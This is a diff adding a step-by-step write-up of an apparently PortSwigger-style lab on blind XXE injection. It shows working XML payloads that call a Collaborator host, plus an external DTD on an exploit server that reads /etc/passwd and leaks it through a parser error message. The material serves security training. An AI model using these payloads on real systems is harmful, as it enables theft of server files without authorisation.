@@ -1,0 +1,40 @@
+Exploiting blind XXE to retrieve data via error messages
+Goal: Exploit blind XXE injection to trigger an error message that displays the content of the /etc/passwd file.
+
+1)
+-Click Product
+-Check Stock
+-Send to Repeater
+-Grab url from Collaborator
+-Send
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://ozrru3idbcix2yg7mzlx2pzr8iec23qs.oastify.com">]>
+<stockCheck><productId>
+&xxe;
+</productId><storeId>1</storeId></stockCheck>
+-> External entities not allowed
+
+2)
+- Try Parameter Entity:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://ozrru3idbcix2yg7mzlx2pzr8iec23qs.oastify.com"> %xxe;]>
+<stockCheck><productId>
+1
+</productId><storeId>1</storeId></stockCheck>
+-> Error from xml parser
+-> Collaborator got a ping back
+
+3)
+-Goto exploit server
+-Add Body
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
+
+Repeater:
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [<!ENTITY % xxe SYSTEM "https://exploit-0af800cf03393d5d8111ce93019f00ec.exploit-server.net/exploit"> %xxe;]>
+<stockCheck><productId>
+1
+</productId><storeId>1</storeId></stockCheck>
